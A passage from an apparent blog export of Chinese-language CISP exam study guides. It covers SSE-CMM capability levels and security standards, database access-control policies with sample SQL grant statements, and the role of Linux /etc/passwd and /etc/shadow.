信息安全控制实践 │ ├── ISO&#x2F;IEC 15408 - 通用准则（CC） │ └── ISO&#x2F;IEC 27005 - 信息安全风险管理 ├── 国家标准 │ ├── GB&#x2F;T 22239 - 信息安全等级保护 │ ├── GB&#x2F;T 20984 - 信息安全风险评估规范 │ ├── GB&#x2F;T 25070 - 信息安全事件管理 │ └── GB&#x2F;Z 24364 - 信息安全风险管理指南 ├── 行业标准 │ ├── 金融行业标准 │ ├── 电信行业标准 │ ├── 电力行业标准 │ └── 医疗行业标准 └── 国密标准 ├── GM&#x2F;T 0001 - SM1算法 ├── GM&#x2F;T 0002 - SM2算法 ├── GM&#x2F;T 0003 - SM3算法 └── GM&#x2F;T 0004 - SM4算法 国际标准化组织： 组织 全称 主要领域 ISO International Organization for Standardization 综合标准 IEC International Electrotechnical Commission 电工电子标准 ITU International Telecommunication Union 电信标准 IEEE Institute of Electrical and Electronics Engineers 电气电子工程标准 IETF Internet Engineering Task Force 互联网标准 四、SSE-CMM（系统安全工程能力成熟度模型） 4.1 SSE-CMM概述 SSE-CMM的定义： 🔒 什么是SSE-CMMSSE-CMM（Systems Security Engineering Capability Maturity Model）是系统安全工程能力成熟度模型，用于评估和改进组织的安全工程能力。 核心目的： 📊 评估能力 评估组织的安全工程能力 识别能力差距 确定改进方向 🎯 指导改进 提供改进路径 定义最佳实践 支持持续改进 🤝 促进协作 统一安全工程语言 促进跨学科协作 整合安全工程与其他工程学科 4.2 SSE-CMM的能力级别 💡 SSE-CMM的正确理解SSE-CMM的能力级别： ✅ 6个能力级别（0-5级） 0级：不完整（Incomplete）- 不能执行基本实践 1级：已执行（Performed）- 能执行基本实践 2级：已管理（Managed）- 有管理和监控 3级：已定义（Defined）- 有标准化过程 4级：可预测（Predictable）- 可量化管理 5级：持续优化（Optimizing）- 持续改进创新 ⚠️ 关于最高级（5级）的常见误区 5级不是追求结果完全相同 5级强调持续优化和创新 结果质量应该是持续提升的，而不是固定不变 允许根据情况调整和优化 ⚠️ 关于过程域的常见误区 SSE-CMM不是只定义3个风险过程 SSE-CMM包含多个过程域（工程、项目、组织） 风险评估是工程过程域的一部分 ⚠️ 关于与其他工程学科关系的常见误区 SSE-CMM不强调独立性 SSE-CMM强调安全工程与其他工程学科的协作和整合 安全应该融入整个系统工程过程 强调跨学科协作 SSE-CMM的6个能力级别： graph TB A[\"SSE-CMM能力级别\"] B[\"0级：不完整Incomplete\"] C[\"1级：已执行Performed\"] D[\"2级：已管理Managed\"] E[\"3级：已定义Defined\"] F[\"4级：可预测Predictable\"] G[\"5级：持续优化Optimizing\"] A --> B B --> C C --> D D --> E E --> F F --> G B --> B1[\"不能执行基本实践\"] C --> C1[\"能执行基本实践\"] D --> D1[\"有管理和监控\"] E --> E1[\"有标准化过程\"] F --> F1[\"可量化管理\"] G --> G1[\"持续改进创新\"] style B fill:#ffcdd2,stroke:#c62828 style C fill:#fff3e0,stroke:#f57c00 style D fill:#fff9c4,stroke:#f57f17 style E fill:#e8f5e9,stroke:#388e3d style F fill:#e3f2fd,stroke:#1976d2 style G fill:#f3e5f5,stroke:#7b1fa2 6个能力级别详解： 级别 名称 特征 关键实践 0级 不完整（Incomplete） 不能执行基本实践 无或不完整 1级 已执行（Performed） 能执行基本实践 执行基本任务 2级 已管理（Managed） 有管理和监控 计划、跟踪、验证 3级 已定义（Defined） 有标准化过程 标准过程、培训 4级 可预测（Predictable） 可量化管理 度量、分析、控制 5级 持续优化（Optimizing） 持续改进创新 创新、优化、改进 4.3 SSE-CMM的能力级别特征 各级别的详细特征： SSE-CMM能力级别特征： 0级：不完整（Incomplete） ├── 不能执行过程域的基本实践 ├── 缺乏必要的资源和技能 ├── 过程不完整或不一致 └── 结果不可预测 1级：已执行（Performed） ├── 能够执行基本实践 ├── 完成必要的工作 ├── 但缺乏系统的管理 └── 依赖个人能力 2级：已管理（Managed） ├── 有计划和跟踪 ├── 有资源管理 ├── 有配置管理 ├── 有质量保证 └── 有度量和分析 3级：已定义（Defined） ├── 有标准化的过程 ├── 有过程文档 ├── 有培训计划 ├── 有过程改进 └── 组织级的一致性 4级：可预测（Predictable） ├── 有量化的过程目标 ├── 有统计过程控制 ├── 有性能度量 ├── 结果可预测 └── 过程能力已知 5级：持续优化（Optimizing） ├── 持续改进过程 ├── 创新和优化 ├── 预防缺陷 ├── 技术变更管理 └── 组织持续学习 为什么选项B错误： ⚠️ 对最高级的误解错误说法：达到SSE-CMM最高级以后，工程队伍执行同一个过程，每次执行的结果质量必须相同。 ❌ 问题： 这是对5级（持续优化）的误解 5级不是追求结果完全相同 5级强调的是持续改进和创新 结果应该是持续提升的 ✅ 正确理解5级（持续优化）： 🔄 持续改进过程 💡 鼓励创新和优化 📈 结果质量持续提升 🎯 预防缺陷而非重复 🔍 主动识别改进机会 📊 基于数据驱动改进 5级的关键特征： 不是固定不变，而是持续优化 不是重复相同，而是不断改进 不是僵化执行，而是灵活创新 不是结果相同，而是质量提升 5级（持续优化）的实际含义： graph TB A[\"5级：持续优化\"] B[\"持续改进\"] C[\"创新优化\"] D[\"预防缺陷\"] E[\"技术变更\"] A --> B A --> C A --> D A --> E B --> B1[\"识别改进机会\"] B --> B2[\"实施改进措施\"] B --> B3[\"评估改进效果\"] C --> C1[\"引入新技术\"] C --> C2[\"优化过程\"] C --> C3[\"提升效率\"] D --> D1[\"根因分析\"] D --> D2[\"预防措施\"] D --> D3[\"减少缺陷\"] E --> E1[\"评估新技术\"] E --> E2[\"管理变更\"] E --> E3[\"降低风险\"] style A fill:#f3e5f5,stroke:#7b1fa2 style B fill:#e8f5e9,stroke:#388e3d style C fill:#e3f2fd,stroke:#1976d2 style D fill:#fff3e0,stroke:#f57c00 style E fill:#fce4ec,stroke:#c2185b 4.4 SSE-CMM的过程域 SSE-CMM的主要过程域： SSE-CMM过程域（不是只有3个风险过程）： ├── 工程过程域 │ ├── 管理安全控制 │ ├── 评估影响 │ ├── 评估安全风险 │ ├── 评估威胁 │ ├── 评估脆弱性 │ ├── 构建保障论证 │ ├── 协调安全 │ ├── 监控安全态势 │ ├── 提供安全输入 │ ├── 规定安全需求 │ └── 验证和确认安全 ├── 项目过程域 │ ├── 确保质量 │ ├── 管理配置 │ ├── 管理项目风险 │ ├── 监控和控制技术工作 │ └── 计划技术工作 └── 组织过程域 ├── 定义组织的系统工程过程 ├── 改进组织的系统工程过程 ├── 管理产品线演进 ├── 管理系统工程支持环境 └── 提供持续的技能和知识 为什么选项C错误： ⚠️ 对过程域的误解错误说法：SSE-CMM定义了3个风险过程：评价威胁，评价脆弱性，评价影响。 ❌ 问题： SSE-CMM不是只定义3个风险过程 SSE-CMM包含多个过程域 风险相关的过程域包括但不限于这3个 ✅ 正确理解： SSE-CMM定义了多个过程域 包括工程、项目、组织三大类 风险评估是工程过程域的一部分 还包括其他重要过程域 4.5 SSE-CMM与其他工程学科的关系 SSE-CMM强调整合而非独立： graph TB A[\"系统安全工程\"] B[\"系统工程\"] C[\"软件工程\"] D[\"硬件工程\"] E[\"网络工程\"] A B A C A D A E A --> A1[\"整合协作\"] A --> A2[\"跨学科\"] A --> A3[\"融入过程\"] style A fill:#ffebee,stroke:#c62828 style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 style E fill:#f3e5f5,stroke:#7b1fa2 为什么选项D错误： ⚠️ 对SSE-CMM理念的误解错误说法：SSE-CMM强调系统安全工程与其他工程学科的区别性和独立性 ❌ 问题： SSE-CMM不强调独立性 相反，SSE-CMM强调整合和协作 安全应该融入整个工程过程 ✅ 正确理解： 🤝 强调与其他工程学科的协作 🔄 强调安全工程的整合 📊 强调跨学科的协同 🎯 安全融入整个系统工程 💡 不是独立的，而是整合的 SSE-CMM的整合理念： 方面 独立性（错误） 整合性（正确） 与系统工程 独立进行 融入系统工程过程 与软件工程 分离开发 安全融入开发生命周期 与项目管理 单独管理 整合到项目管理中 团队协作 安全团队独立 跨学科团队协作 过程执行 独立的安全过程 安全融入各个过程 4.6 SSE-CMM的应用 SSE-CMM的主要用途： SSE-CMM应用场景： ├── 能力评估 │ ├── 评估组织安全工程能力 │ ├── 识别能力差距 │ ├── 确定改进优先级 │ └── 制定改进计划 ├── 过程改进 │ ├── 定义标准过程 │ ├── 优化现有过程 │ ├── 提升过程成熟度 │ └── 持续改进 ├── 供应商选择 │ ├── 评估供应商能力 │ ├── 比较不同供应商 │ ├── 降低采购风险 │ └── 确保质量 └── 培训和发展 ├── 识别培训需求 ├── 制定培训计划 ├── 提升团队能力 └── 建立专业队伍 SSE-CMM评估示例： 某公司SSE-CMM评估结果： 过程域：评估安全风险 ├── 当前能力级别：2级（已管理） ├── 目标能力级别：3级（已定义） ├── 差距分析： │ ├── 缺少标准化的风险评估过程 │ ├── 缺少过程文档和指南 │ ├── 缺少系统的培训计划 │ └── 缺少过程改进机制 └── 改进计划： ├── 制定标准风险评估流程 ├── 编写过程文档和模板 ├── 开展风险评估培训 ├── 建立过程改进机制 └── 预计6个月达到3级 五、信息安全保障工作 5.1 国务院信息化办公室九项重点工作 📋 信息安全保障九项重点工作我国国务院信息化办公室为加强信息安全保障，明确提出了九项重点工作内容。 九项重点工作： 1️⃣ 保证信息安全资金投入 确保信息安全建设的资金保障 合理分配安全预算 持续投入安全建设 2️⃣ 加快信息安全人才培养 建立人才培养体系 加强专业教育和培训 提升从业人员能力 3️⃣ 重视信息安全应急处理工作 建立应急响应机制 制定应急预案 提升应急处理能力 4️⃣ 加强信息安全技术研发 推动自主创新 研发核心技术 提升技术能力 5️⃣ 完善信息安全标准体系 制定和完善标准 推动标准实施 加强标准化工作 6️⃣ 加强信息安全管理 建立管理体系 完善管理制度 提升管理水平 7️⃣ 推进信息安全等级保护 实施等级保护制度 开展等级测评 加强分级保护 8️⃣ 加强信息安全监督检查 开展安全检查 加强监督管理 确保落实到位 9️⃣ 加强信息安全宣传教育 提高安全意识 普及安全知识 营造安全文化 ⚠️ 注意：不包括&quot;提高信息技术产品的国产化率&quot; 虽然国产化很重要，但不在九项重点工作之列 国产化是技术发展的方向，但不是信息安全保障的直接工作内容 九项工作更侧重于安全保障的直接措施 九项重点工作的关系： graph TB A[\"信息安全保障九项重点工作\"] B[\"资源保障\"] C[\"能力建设\"] D[\"技术支撑\"] E[\"管理体系\"] F[\"监督落实\"] A --> B A --> C A --> D A --> E A --> F B --> B1[\"资金投入\"] C --> C1[\"人才培养\"] C --> C2[\"应急处理\"] C --> C3[\"宣传教育\"] D --> D1[\"技术研发\"] D --> D2[\"标准体系\"] E --> E1[\"安全管理\"] E --> E2[\"等级保护\"] F --> F1[\"监督检查\"] style A fill:#e3f2fd,stroke:#1976d2,stroke-width:3px style B fill:#fff3e0,stroke:#f57c00 style C fill:#e8f5e9,stroke:#388e3d style D fill:#f3e5f5,stroke:#7b1fa2 style E fill:#fce4ec,stroke:#c2185b style F fill:#ffebee,stroke:#c62828 ⚠️ 易错点不属于九项重点工作的内容： ❌ 提高信息技术产品的国产化率 这不是九项重点工作之一 虽然国产化很重要，但属于技术发展战略 不是信息安全保障的直接工作内容 为什么容易混淆： 国产化与信息安全密切相关 自主可控是安全的重要保障 但九项工作侧重于安全保障的直接措施 国产化是更宏观的技术发展方向 5.2 九项工作的实施要点 各项工作的关键要素： 九项重点工作实施要点： 1. 保证信息安全资金投入 ├── 制定安全预算 ├── 确保资金到位 ├── 合理分配使用 └── 监督资金使用效果 2. 加快信息安全人才培养 ├── 建立培养体系 ├── 开展专业教育 ├── 加强在职培训 └── 引进高端人才 3. 重视信息安全应急处理工作 ├── 建立应急机制 ├── 制定应急预案 ├── 组建应急队伍 └── 开展应急演练 4. 加强信息安全技术研发 ├── 推动自主创新 ├── 研发核心技术 ├── 突破关键技术 └── 转化研究成果 5. 完善信息安全标准体系 ├── 制定国家标准 ├── 完善行业标准 ├── 推动标准实施 └── 参与国际标准 6. 加强信息安全管理 ├── 建立管理体系 ├── 完善管理制度 ├── 规范管理流程 └── 提升管理水平 7. 推进信息安全等级保护 ├── 实施等级保护制度 ├── 开展定级备案 ├── 进行等级测评 └── 落实整改措施 8. 加强信息安全监督检查 ├── 制定检查计划 ├── 开展定期检查 ├── 发现问题隐患 └── 督促整改落实 9. 加强信息安全宣传教育 ├── 开展安全培训 ├── 普及安全知识 ├── 提高安全意识 └── 营造安全文化 5.3 九项工作的相互关系 九项工作不是孤立的，而是相互支撑的： 💡 九项工作的协同效应资源保障是基础： 资金投入为其他工作提供物质保障 没有资金投入，其他工作难以开展 能力建设是核心： 人才培养提供智力支持 应急处理提升响应能力 宣传教育提高全员意识 技术支撑是关键： 技术研发提供技术保障 标准体系提供规范指导 管理体系是保障： 安全管理提供制度保障 等级保护提供分级保护 监督落实是手段： 监督检查确保工作落实 发现问题及时整改 九项工作的实施循环： graph TB A[\"资金投入\"] B[\"人才培养\"] C[\"技术研发\"] D[\"标准制定\"] E[\"管理体系\"] F[\"等级保护\"] G[\"应急处理\"] H[\"监督检查\"] I[\"宣传教育\"] A --> B A --> C B --> C C --> D D --> E E --> F F --> G G --> H H --> I I -.\"反馈改进\".-> A style A fill:#fff3e0,stroke:#f57c00 style B fill:#e8f5e9,stroke:#388e3d style C fill:#e3f2fd,stroke:#1976d2 style D fill:#f3e5f5,stroke:#7b1fa2 style E fill:#fce4ec,stroke:#c2185b style F fill:#ffebee,stroke:#c62828 style G fill:#e0f2f1,stroke:#00695c style H fill:#fff9c4,stroke:#f57f17 style I fill:#ede7f6,stroke:#5e35b1 5.4 国产化与信息安全的关系 🔍 国产化的重要性虽然&quot;提高信息技术产品的国产化率&quot;不在九项重点工作之列，但国产化对信息安全仍然非常重要。 国产化的意义： 🔒 自主可控 减少对国外技术的依赖 降低供应链风险 提升安全可控性 🛡️ 安全保障 避免后门和漏洞风险 提升安全审查能力 增强安全防护能力 💪 技术发展 推动自主创新 提升技术水平 增强竞争力 但为什么不在九项工作中： 国产化是更宏观的技术发展战略 九项工作侧重于安全保障的直接措施 国产化通过&quot;技术研发&quot;等工作间接体现 国产化与九项工作的关系： 国产化如何支撑九项工作： ├── 支撑技术研发 │ ├── 推动自主创新 │ ├── 研发核心技术 │ └── 减少技术依赖 ├── 支撑标准体系 │ ├── 制定国产标准 │ ├── 推动标准应用 │ └── 提升标准话语权 ├── 支撑安全管理 │ ├── 提升可控性 │ ├── 降低安全风险 │ └── 增强安全保障 └── 支撑等级保护 ├── 提供安全产品 ├── 满足等保要求 └── 提升防护能力 六、总结 系统工程、密码算法与标准的核心要点： 系统工程：强调整体性和综合性，不是分别独立研究 分组密码：按固定长度块加密，不同于序列密码 标准体系：国家标准优先，国际标准通常是推荐性的 🎯 关键要点 系统工程采用自顶向下的设计方法 系统工程强调多学科协作和综合集成 系统工程不是分别独立研究，而是综合考虑相互关系 分组密码按固定长度块加密（DES、AES、IDEA） 序列密码逐位或逐字节加密（RC4） 分组密码和序列密码是两种不同的算法 国际标准通常是推荐性的，不是强制性的 标准冲突时，国家标准优先于行业标准和地方标准 国家标准公布后，相应的地方标准应废止 国务院信息化办公室提出九项重点工作 &quot;提高信息技术产品的国产化率&quot;不在九项工作之列 九项工作涵盖资金、人才、应急、技术、标准、管理、等保、监督、宣传 💡 实践建议 应用系统工程方法构建安全体系 采用整体规划、分层设计的方法 选择合适的密码算法和工作模式 AES是当前推荐的分组密码标准 遵守国家和行业的信息安全标准 关注标准的更新和演进 建立符合标准的安全管理体系","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：数据库安全","slug":"2025/10/CISP-Database-Security-zh-CN","date":"un44fin44","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Database-Security/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Database-Security/","excerpt":"深入解析CISP认证中的数据库安全知识点，涵盖数据库安全策略、访问控制和安全机制。","text":"数据库安全是信息安全的重要组成部分，需要考虑多种安全策略和机制，才能更好地保护数据库的安全。 一、数据库安全概述 1.1 数据库安全的重要性 数据库是组织最重要的信息资产之一，包含大量敏感和关键数据，因此数据库安全至关重要。 💡 CIA三要素数据库安全的核心目标是保护信息的机密性（Confidentiality）、完整性（Integrity）和可用性（Availability）。 详细内容请参考：CISP学习指南：信息安全CIA三要素 1.2 数据库面临的威胁 主要威胁类型： 威胁类型 描述 示例 未授权访问 非法用户访问数据库 SQL注入、权限提升 数据泄露 敏感数据被窃取 内部泄密、外部攻击 数据篡改 数据被非法修改 恶意修改、误操作 拒绝服务 数据库服务中断 DDoS攻击、资源耗尽 权限滥用 合法用户滥用权限 内部人员越权操作 二、数据库安全策略 2.1 六大安全策略 📋 数据库安全的六大策略数据库安全策略包括六项： 最小特权策略 最大共享策略 粒度适当策略 按内容存取控制策略 开系统和闭系统策略 按存取类型控制策略 graph TB A[\"数据库安全策略\"] B[\"最小特权策略\"] C[\"最大共享策略\"] D[\"粒度适当策略\"] E[\"按内容存取控制策略\"] F[\"开系统和闭系统策略\"] G[\"按存取类型控制策略\"] A --> B A --> C A --> D A --> E A --> F A --> G style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 style E fill:#f3e5f5,stroke:#7b1fa2 style F fill:#fce4ec,stroke:#c2185b style G fill:#e1f5fe,stroke:#0277bd 2.2 最小特权策略 🔐 最小特权原则**定义：**让用户可以合法地存取或修改数据库的前提下，分配最小特权，使得这些信息恰好能够实现用户的工作。 核心思想： 只授予完成工作所需的最小权限 不授予额外的权限 降低权限滥用风险 最小特权策略的实施： 用户角色 需要的权限 授予的权限 不授予的权限 数据录入员 INSERT INSERT SELECT, UPDATE, DELETE 数据查询员 SELECT SELECT INSERT, UPDATE, DELETE 数据分析师 SELECT SELECT INSERT, UPDATE, DELETE 数据管理员 全部 根据职责授予 不相关的权限 示例： -- 正确：最小特权 GRANT SELECT ON employees TO analyst; -- 错误：过度授权 GRANT ALL PRIVILEGES ON employees TO analyst; 最小特权的优势： ✅ 降低数据泄露风险 ✅ 减少误操作影响 ✅ 限制内部威胁 ✅ 便于审计追踪 2.3 最大共享策略 🤝 最大共享原则**定义：**在保护数据库的完整性、保密性和可用性的前提下，最大程度地共享数据库中的信息。 核心思想： 在安全的前提下最大化数据共享 平衡安全和可用性 提高数据利用效率 最大共享策略的实施： graph TB A[\"最大共享策略\"] B[\"安全前提\"] C[\"共享机制\"] D[\"访问控制\"] A --> B A --> C A --> D B --> B1[\"保护完整性\"] B --> B2[\"保护保密性\"] B --> B3[\"保证可用性\"] C --> C1[\"视图机制\"] C --> C2[\"角色机制\"] C --> C3[\"权限继承\"] D --> D1[\"细粒度控制\"] D --> D2[\"动态授权\"] D --> D3[\"审计监控\"] style B fill:#ffcdd2,stroke:#c62828 style C fill:#e8f5e9,stroke:#388e3d style D fill:#e3f2fd,stroke:#1976d2 共享与安全的平衡： 场景 安全要求 共享方式 控制措施 公开数据 低 完全共享 基本访问控制 内部数据 中 部门共享 角色权限控制 敏感数据 高 限制共享 细粒度控制+审计 机密数据 极高 最小共享 强制访问控制+加密 实现最大共享的技术： -- 使用视图实现数据共享 CREATE VIEW employee_public AS SELECT emp_id, name, department FROM employees; -- 授予视图访问权限 GRANT SELECT ON employee_public TO public_users; 2.4 粒度适当策略 📏 粒度适当原则**定义：**将数据库中不同的项分成不同的粒度，颗粒越小、安全级别越高，通常要根据实际决定粒度大小。 核心思想： 粒度大小影响安全性和性能 粒度越小，安全级别越高，但性能开销越大 需要根据实际情况选择适当粒度 不是选择最小粒度 ⚠️ 常见错误理解错误说法：粒度最小策略，将数据库中的数据项进行划分，粒度越小，安全级别越高，在实际中需要选择最小粒度。 ❌ 为什么这是错误的： 不是&quot;粒度最小策略&quot;，而是&quot;粒度适当策略&quot; 不是&quot;需要选择最小粒度&quot;，而是&quot;根据实际决定粒度大小&quot; 最小粒度会带来性能问题和管理复杂度 ✅ 正确理解： 粒度越小，安全级别越高（这是对的） 但需要平衡安全性和性能 根据实际需求选择适当粒度 不是一味追求最小粒度 数据库粒度层次： graph TB A[\"数据库粒度\"] B[\"数据库级\"] C[\"表级\"] D[\"行级\"] E[\"列级\"] F[\"单元格级\"] A --> B B --> C C --> D D --> E E --> F B --> B1[\"粒度最大性能最好安全性最低\"] F --> F1[\"粒度最小性能最差安全性最高\"] style B fill:#c8e6c9,stroke:#2e7d32 style C fill:#a5d6a7,stroke:#388e3c style D fill:#81c784,stroke:#43a047 style E fill:#66bb6a,stroke:#4caf50 style F fill:#ffcdd2,stroke:#c62828 粒度选择对比： 粒度级别 安全性 性能 管理复杂度 适用场景 数据库级 ⭐ 低 ⭐⭐⭐⭐⭐ 高 ⭐ 低 开发环境 表级 ⭐⭐ 中低 ⭐⭐⭐⭐ 高 ⭐⭐ 中低 一般应用 行级 ⭐⭐⭐ 中 ⭐⭐⭐ 中 ⭐⭐⭐ 中 多租户系统 列级 ⭐⭐⭐⭐ 高 ⭐⭐ 低 ⭐⭐⭐⭐ 高 敏感字段保护 单元格级 ⭐⭐⭐⭐⭐ 极高 ⭐ 极低 ⭐⭐⭐⭐⭐ 极高 极少使用 粒度选择示例： -- 表级粒度（粗粒度） GRANT SELECT ON employees TO hr_staff; -- 列级粒度（中粒度） GRANT SELECT (emp_id, name, department) ON employees TO hr_staff; -- 行级粒度（细粒度） CREATE POLICY emp_policy ON employees FOR SELECT USING (department &#x3D; current_user_department()); 粒度选择原则： 根据数据敏感度选择 公开数据：粗粒度（表级） 内部数据：中粒度（行级或列级） 敏感数据：细粒度（列级或行级） 考虑性能影响 高并发系统：避免过细粒度 查询密集型：选择适中粒度 更新密集型：考虑粒度锁定影响 平衡管理成本 粒度越细，管理越复杂 需要更多的权限配置 增加维护工作量 2.5 按内容存取控制策略 📄 按内容存取控制**定义：**不同权限的用户访问数据库的不同部分。 核心思想： 根据数据内容控制访问 不同用户看到不同的数据 实现数据隔离 按内容存取控制的实现： graph TB A[\"按内容存取控制\"] B[\"基于行的控制\"] C[\"基于列的控制\"] D[\"基于值的控制\"] A --> B A --> C A --> D B --> B1[\"用户只能访问特定行\"] C --> C1[\"用户只能访问特定列\"] D --> D1[\"根据数据值控制访问\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 实现示例： -- 基于行的内容控制 CREATE VIEW sales_dept_view AS SELECT * FROM employees WHERE department &#x3D; &#39;Sales&#39;; GRANT SELECT ON sales_dept_view TO sales_manager; -- 基于列的内容控制 CREATE VIEW employee_basic AS SELECT emp_id, name, department FROM employees; GRANT SELECT ON employee_basic TO all_staff; -- 基于值的内容控制（行级安全） CREATE POLICY salary_policy ON employees FOR SELECT USING ( CASE WHEN current_user_role() &#x3D; &#39;HR&#39; THEN true WHEN current_user_role() &#x3D; &#39;Manager&#39; AND department &#x3D; current_user_department() THEN true ELSE false END ); 应用场景： 场景 控制方式 示例 部门数据隔离 基于行 销售部只能看销售数据 敏感字段保护 基于列 普通员工看不到工资 多租户系统 基于值 租户只能看自己的数据 分级数据访问 组合控制 根据级别看不同数据 2.6 开系统和闭系统策略 🔓🔒 开系统 vs 闭系统开系统策略： 默认允许访问 明确禁止特定访问 适用于开放环境 闭系统策略： 默认拒绝访问 明确允许特定访问 适用于安全环境 策略对比： 特征 开系统策略 闭系统策略 默认行为 允许 拒绝 安全性 较低 较高 易用性 较高 较低 管理复杂度 较低 较高 适用场景 内部系统、开发环境 生产环境、敏感系统 实现示例： -- 开系统策略 GRANT SELECT ON ALL TABLES TO public; REVOKE SELECT ON sensitive_table FROM public; -- 闭系统策略（推荐） REVOKE ALL ON ALL TABLES FROM public; GRANT SELECT ON public_table TO specific_users; 2.7 按存取类型控制策略 🔧 按存取类型控制**定义：**根据不同的操作类型（读、写、删除等）进行访问控制。 核心思想： 区分不同的操作权限 细化权限管理 实现职责分离 存取类型分类： graph TB A[\"存取类型\"] B[\"SELECT查询\"] C[\"INSERT插入\"] D[\"UPDATE更新\"] E[\"DELETE删除\"] F[\"EXECUTE执行\"] G[\"ALTER修改结构\"] A --> B A --> C A --> D A --> E A --> F A --> G style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 style E fill:#ffcdd2,stroke:#c62828 style F fill:#f3e5f5,stroke:#7b1fa2 style G fill:#fce4ec,stroke:#c2185b 权限组合示例： 用户角色 SELECT INSERT UPDATE DELETE 说明 查询员 ✅ ❌ ❌ ❌ 只读权限 录入员 ✅ ✅ ❌ ❌ 查询和新增 编辑员 ✅ ✅ ✅ ❌ 查询、新增、修改 管理员 ✅ ✅ ✅ ✅ 全部权限 实现示例： -- 按存取类型授权 GRANT SELECT ON orders TO sales_staff; GRANT INSERT ON orders TO sales_staff; GRANT UPDATE (status) ON orders TO sales_staff; -- 拒绝删除权限 REVOKE DELETE ON orders FROM sales_staff; 三、数据库安全机制 3.1 身份认证 认证方式： 🔑 用户名/密码认证 🎫 Kerberos认证 📱 多因素认证 🔐 证书认证 3.2 访问控制 💡 访问控制模型数据库访问控制包括自主访问控制（DAC）、强制访问控制（MAC）和基于属性的访问控制（ABAC）。 详细内容请参考：CISP学习指南：访问控制 数据库特定的访问控制实现： 用户级权限：GRANT/REVOKE 角色管理：CREATE ROLE 行级安全：Row-Level Security (RLS) 列级权限：Column-Level Privileges 3.3 审计 审计内容： 📋 登录/登出记录 🔍 数据访问记录 ✏️ 数据修改记录 ⚙️ 权限变更记录 🚨 异常行为记录 3.4 加密 数据加密： 加密类型 说明 适用场景 传输加密 TLS/SSL 网络传输 存储加密 透明数据加密（TDE） 数据文件 列加密 特定列加密 敏感字段 备份加密 备份文件加密 备份存储 四、总结 数据库安全策略的核心要点： 最小特权策略：授予最小必要权限 最大共享策略：在安全前提下最大化共享 粒度适当策略：根据实际选择适当粒度，不是最小粒度 按内容存取控制：不同用户访问不同数据 开闭系统策略：根据环境选择策略 按存取类型控制：区分不同操作权限 🎯 关键要点 数据库安全需要多种策略配合 最小特权原则是基础 粒度适当策略不是选择最小粒度 需要根据实际情况平衡安全性和性能 按内容和按类型控制实现细粒度访问控制 审计和加密是重要的安全机制 💡 实践建议 实施最小权限原则 根据数据敏感度选择适当粒度 使用角色简化权限管理 启用数据库审计 加密敏感数据 定期审查权限配置 监控异常访问行为","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：Linux系统安全","slug":"2025/10/CISP-Linux-System-Security-zh-CN","date":"un44fin44","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Linux-System-Security/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Linux-System-Security/","excerpt":"深入解析CISP认证中的Linux系统安全知识点，涵盖用户认证、密码管理和系统安全配置。","text":"Linux系统安全是信息安全的重要组成部分，理解Linux的安全机制对于保护系统和数据至关重要。 一、Linux用户认证机制 1.1 /etc/passwd文件 /etc/passwd文件是Unix/Linux系统中最重要的安全文件之一，用于存储用户账户信息。 passwd文件的作用： graph TB A[\"/etc/passwd文件\"] B[\"用户登录\"] C[\"系统管理\"] D[\"权限控制\"] A --> B A --> C A --> D B --> B1[\"验证用户名\"] B --> B2[\"获取UID\"] B --> B3[\"确定Shell\"] C --> C1[\"用户信息查询\"] C --> C2[\"账户管理\"] D --> D1[\"文件所有权\"] D --> D2[\"进程权限\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#e8f5e9,stroke:#388e3d style C fill:#fff3e0,stroke:#f57c00 style D fill:#f3e5f5,stroke:#7b1fa2 1.2 passwd文件格式 passwd文件的字段结构： username:password:UID:GID:comment:home:shell 各字段说明： 字段 说明 示例 username 登录名 root, user1 password 加密口令或占位符 x, *, ! UID 用户ID 0（root）, 1000（普通用户） GID 默认组ID 0, 1000 comment 用户信息（GECOS） Root User, John Doe home 用户主目录 /root, /home/user1 shell 登录Shell /bin/bash, /bin/sh passwd文件示例： root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin user1:x:1000:1000:User One:&#x2F;home&#x2F;user1:&#x2F;bin&#x2F;bash mysql:x:999:999:MySQL Server:&#x2F;var&#x2F;lib&#x2F;mysql:&#x2F;bin&#x2F;false 1.3 密码字段的演变 传统passwd文件（不安全）： root:$1$abc123...:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash 密码直接存储在passwd文件中 passwd文件所有用户可读 容易被暴力破解 现代passwd文件（安全）： root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash 密码字段显示为&quot;x&quot; 实际密码存储在/etc/shadow文件中 shadow文件只有root可读 二、/etc/shadow文件 2.1 shadow文件的作用 💡 为什么passwd文件中密码显示为'x'passwd文件中密码字段显示为&quot;x&quot;的原因是：加密口令被转移到了另一个文件里。 原因分析： 🔐 安全性考虑 /etc/passwd文件所有用户可读（需要查询用户信息） 如果密码存储在passwd中，容易被窃取 政击者可以离线暴力破解密码 🛡️ shadow文件机制 密码被转移到/etc/shadow文件 shadow文件只有root用户可读 普通用户无法访问加密密码 大大提高了安全性 ✅ &quot;x&quot;的含义 &quot;x&quot;表示密码存储在shadow文件中 不是密码的加密结果 只是一个占位符 告诉系统去shadow文件查找密码 常见误解： 误解 为什么错误 passwd文件是假的 